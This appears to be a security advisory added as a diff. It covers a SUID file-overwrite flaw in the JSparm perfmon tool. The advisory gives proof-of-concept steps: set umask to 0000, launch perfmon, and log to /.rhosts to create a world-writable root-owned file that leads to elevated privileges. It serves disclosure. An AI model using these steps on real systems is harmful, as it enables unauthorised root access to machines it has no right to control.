@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/2515/info
+
+JSparm is the Junsoft Performance Analysis Report Maker package. This software package provides an enhanced perfmon performance monitoring package and interface, as well as a performance report generation interface.
+
+A problem with the package could make it possible for a user with local access to overwrite any file on the system. It is possible for a user to launch the perfmon program from the command line interface, and create a logfile of activity monitored by the perfmon package. The user may specify the file in which the activity should be logged. Insufficient checking of file permissions, as well as the program being SUID, make it possible for the log file to be any file on the system. The file created/overwritten is set to mode 0666.
+
+Therefore, it is possible for a user with local access to overwrite sensitive system files, and gain elevated privileges. 
+
+
+$ whoami
+loveyou
+$ umask 0000
+$ /opt/JSparm/bin/perfmon &
+
+Choose Logging -> Logging File
+In Selection part, input the file path you want to create
+ex: /.rhosts
+
+Following file is created in a second.
+-rw-rw-rw- 1 root loveyou 144 Mar 9 03:14 .rhost
+
